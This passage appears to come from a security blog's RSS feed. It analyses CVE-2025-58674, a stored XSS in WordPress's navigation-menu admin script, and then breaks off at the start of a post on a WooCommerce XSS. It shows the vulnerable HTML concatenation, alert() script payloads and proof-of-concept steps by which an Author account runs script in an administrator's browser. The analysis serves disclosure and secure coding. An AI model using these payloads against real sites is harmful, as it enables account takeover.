replaces the HTML content inside the element, so if &lt;code&gt;menuTitle&lt;/code&gt; contains malicious code it will be executed in the browser.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;updateParentDropdown : function() {&#xA;    return this.each(function(){&#xA;        var menuItems = $( &amp;#39;#menu-to-edit li&amp;#39; ),&#xA;            parentDropdowns = $( &amp;#39;.edit-menu-item-parent&amp;#39; );&#xA;&#xA;        $.each( parentDropdowns, function() {&#xA;            var parentDropdown = $( this ),&#xA;                currentItemID = parseInt( parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() ),&#xA;                currentParentID = parseInt( parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-parent-id&amp;#39; ).val() ),&#xA;                currentItem = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ),&#xA;                currentMenuItemChild = currentItem.childMenuItems(),&#xA;                excludeMenuItem =  /** @type {number[]} */ [ currentItemID ];&#xA;&#xA;            parentDropdown.empty();&#xA;&#xA;            if ( currentMenuItemChild.length &amp;gt; 0 ) {&#xA;                $.each( currentMenuItemChild, function(){&#xA;                    var childItem = $(this),&#xA;                        childID = parseInt( childItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() );&#xA;&#xA;                    excludeMenuItem.push( childID );&#xA;                });&#xA;            }&#xA;&#xA;            parentDropdown.append(&#xA;                $( &amp;#39;&amp;lt;option&amp;gt;&amp;#39;, {&#xA;                    value: &amp;#39;0&amp;#39;,&#xA;                    selected: currentParentID === 0,&#xA;                    text: wp.i18n._x( &amp;#39;No Parent&amp;#39;, &amp;#39;menu item without a parent in navigation menu&amp;#39; ),&#xA;                } )&#xA;            );&#xA;&#xA;            $.each( menuItems, function() {&#xA;                var menuItem = $(this),&#xA;                menuID = parseInt( menuItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() ),&#xA;                menuTitle = menuItem.find( &amp;#39;.edit-menu-item-title&amp;#39; ).val();&#xA;&#xA;                if ( ! excludeMenuItem.includes( menuID ) ) {&#xA;                    parentDropdown.append(&#xA;                        $( &amp;#39;&amp;lt;option&amp;gt;&amp;#39;, {&#xA;                            value: menuID.toString(),&#xA;                            selected: currentParentID === menuID,&#xA;                            text: menuTitle,&#xA;                        } )&#xA;                    );&#xA;                }&#xA;            });&#xA;        });&#xA;        &#xA;    });&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch fixes the issue by explicitly assigning &lt;code&gt;menuTitle&lt;/code&gt; to the &lt;code&gt;text&lt;/code&gt; property instead of injecting it into HTML. This ensures &lt;code&gt;menuTitle&lt;/code&gt; is treated as plain text and cannot contain or execute malicious JavaScript. Thus, data added into the &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; element is safe and the XSS vector via &lt;code&gt;menuTitle&lt;/code&gt; is eliminated.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/dif.png&#34;&#xA;    alt=&#34;Comparison between vulnerable and patched versions&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Comparison between vulnerable and patched versions&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Inspecting the code in the browser shows &lt;code&gt;menuItems = #menu-to-edit li&lt;/code&gt; is an array of &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt; elements inside the &lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt; with &lt;code&gt;id=menu-to-edit&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/viewsource.png&#34;&#xA;    alt=&#34;Inspecting code in the browser&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspecting code in the browser&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;The &lt;code&gt;updateParentDropdown&lt;/code&gt; function iterates over the &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt; elements, retrieves the value of the &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; with class &lt;code&gt;edit-menu-item-title&lt;/code&gt;, assigns that value to &lt;code&gt;menuTitle&lt;/code&gt; inside an &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; tag, and renders it into HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/viewsource1.png&#34;&#xA;    alt=&#34;Inspecting DOM after adding a menu&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspecting DOM after adding a menu&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;In the UI&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/UIlist.png&#34;&#xA;    alt=&#34;Display in the admin UI&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Display in the admin UI&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;In the &lt;a href=&#34;https://github.com/WordPress/WordPress/commit/e5caef19d3e842cc9c8c94621b223a9a696fb5b3&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; there is a change that seems useful but did not help the analysis.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett.png&#34;&#xA;    alt=&#34;HTML entity encode (1)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;HTML entity encode (1)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;I used &lt;code&gt;//&lt;/code&gt; to comment out all lines related to &lt;code&gt;html_entity_decode&lt;/code&gt; of &lt;code&gt;origin_title&lt;/code&gt; but was still able to exploit. Previously I had set debug points at those locations but nothing happened.&lt;/p&gt;&#xA;&lt;p&gt;Besides commenting them out, I selected the menu containing the XSS payload and clicked &lt;kbd&gt;Add to Menu&lt;/kbd&gt;, capturing the request with &lt;strong&gt;Burp Suite&lt;/strong&gt; to see whether the added value was HTML entity encoded.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett1.png&#34;&#xA;    alt=&#34;HTML entity encode (2)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;HTML entity encode (2)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;menu-item-title&lt;/code&gt; is the value taken from the input named &lt;code&gt;menu-item[-5][menu-item-title]&lt;/code&gt; derived from the &lt;code&gt;post-title&lt;/code&gt;, which is &lt;strong&gt;checked&lt;/strong&gt; to add into the request body&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;#34;hidden&amp;#34; class=&amp;#34;menu-item-title&amp;#34; name=&amp;#34;menu-item[-5][menu-item-title]&amp;#34; value=&amp;#34;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;One interesting thing here: the browser takes the decoded HTML entity value to add into the request, meaning the value from the server was encoded before being echoed into HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett2.png&#34;&#xA;    alt=&#34;Browser decodes HTML entity before sending&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Browser decodes HTML entity before sending&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 The browser decoded the HTML entity before rendering the HTML.&lt;/p&gt;&#xA;&lt;p&gt;On the DOM, after clicking &lt;kbd&gt;Add to Menu&lt;/kbd&gt; =&amp;gt; &lt;code&gt;attachTabsPanelListeners&lt;/code&gt; is called and appends the selected value to the bottom of the menu item list.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/addbottom.png&#34;&#xA;    alt=&#34;Appending the item to the end of the menu list&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Appending the item to the end of the menu list&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;edit-menu-item-title&lt;/code&gt; contains the XSS payload. The &lt;code&gt;updateParentDropdown&lt;/code&gt; function will take it and assign it to an &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; element =&amp;gt; XSS occurs&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: &lt;code&gt;post-title&lt;/code&gt; — the post title&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;parentDropdown.html( $html )&lt;/code&gt; which may contain malicious HTML&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;&amp;#39; &amp;#43; menuID &amp;#43; &amp;#39;&amp;#34;&amp;gt;&amp;#39; &amp;#43; menuTitle &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Use an Author account to create a post with a title containing an XSS payload&lt;/li&gt;&#xA;&lt;li&gt;An Admin visits the endpoint &lt;code&gt;wp-admin/nav-menus.php&lt;/code&gt; and adds menus from the created post&lt;/li&gt;&#xA;&lt;li&gt;The JavaScript event is triggered&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/xss.png&#34;&#xA;    alt=&#34;Proof of Concept: XSS&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Proof of Concept: XSS&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;The &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag inside an &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; within a &lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt; can be executed, while other tags inside &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; are not — they only return the text inside.&#xA;{: .prompt-info }&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;When the browser parses the HTML string, the &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; is not truly inside the &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; flow; the parser “lifts” the script out of the &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; and inserts it into the DOM tree.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;select name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34;&amp;gt;&#xA;    &amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;abc&amp;lt;/option&amp;gt;&#xA;    &amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;/option&amp;gt;&#xA;&amp;lt;/select&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Therefore, the script executes immediately, while the &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; remains but its content is empty or displays nothing.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/inspect1.png&#34;&#xA;    alt=&#34;Inspecting DOM after the script is lifted&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspecting DOM after the script is lifted&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;For other tags&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;select name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34;&amp;gt;&#xA;&#x9;&amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;abc&amp;lt;/option&amp;gt;&#xA;&#x9;&amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;b&amp;gt;abd&amp;lt;/b&amp;gt;&amp;lt;/option&amp;gt;&#xA;&amp;lt;/select&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The browser follows the spec: &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; is text-only.&lt;/li&gt;&#xA;&lt;li&gt;When parsing &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; inside an &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; is treated as text =&amp;gt; the tag is removed, only &amp;ldquo;abd&amp;rdquo; is displayed as text.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; is removed entirely.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/inspect2.png&#34;&#xA;    alt=&#34;Inspect: rendering option with inline elements&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect: rendering option with inline elements&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-58674 demonstrates the risk of inserting user-controlled data directly into HTML via &lt;code&gt;html()&lt;/code&gt; or &lt;code&gt;innerHTML&lt;/code&gt;. A &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; inside an &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; can be lifted out by the parser and executed, while other tags are stripped or treated as text. The patch uses the &lt;code&gt;text&lt;/code&gt; property to ensure safety and eliminate XSS.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not concatenate HTML strings from user data and insert them with &lt;code&gt;html()&lt;/code&gt;/&lt;code&gt;innerHTML&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Use safe element creation APIs (&lt;code&gt;option.text&lt;/code&gt;, &lt;code&gt;document.createElement&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Always escape/sanitize data both server-side and client-side.&lt;/li&gt;&#xA;&lt;li&gt;Understand parser behavior: &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; can escape an inert container.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Core &amp;lt;= 6.8.2 is vulnerable to Cross Site Scripting (XSS) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-5062 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-10-cve-2025-5062/</link>
      <pubDate>Fri, 10 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-10-cve-2025-5062/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The WooCommerce plugin for WordPress has a &lt;strong&gt;PostMessage-based Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability via the &lt;strong&gt;&amp;lsquo;customize-store&amp;rsquo;&lt;/strong&gt; page in all versions up to and including &lt;strong&gt;9.4.2&lt;/strong&gt;, due to &lt;strong&gt;insufficiently safe handling of PostMessage data&lt;/strong&gt; (no input sanitization and no escaping when output). This allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to inject arbitrary script into the site that will execute if they can trick a user into performing an action, for example &lt;strong&gt;clicking a link&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-5062&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-5062&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 9.3.2 and from 9.4 through 9.4.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 9.3.4 and 9.4.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low 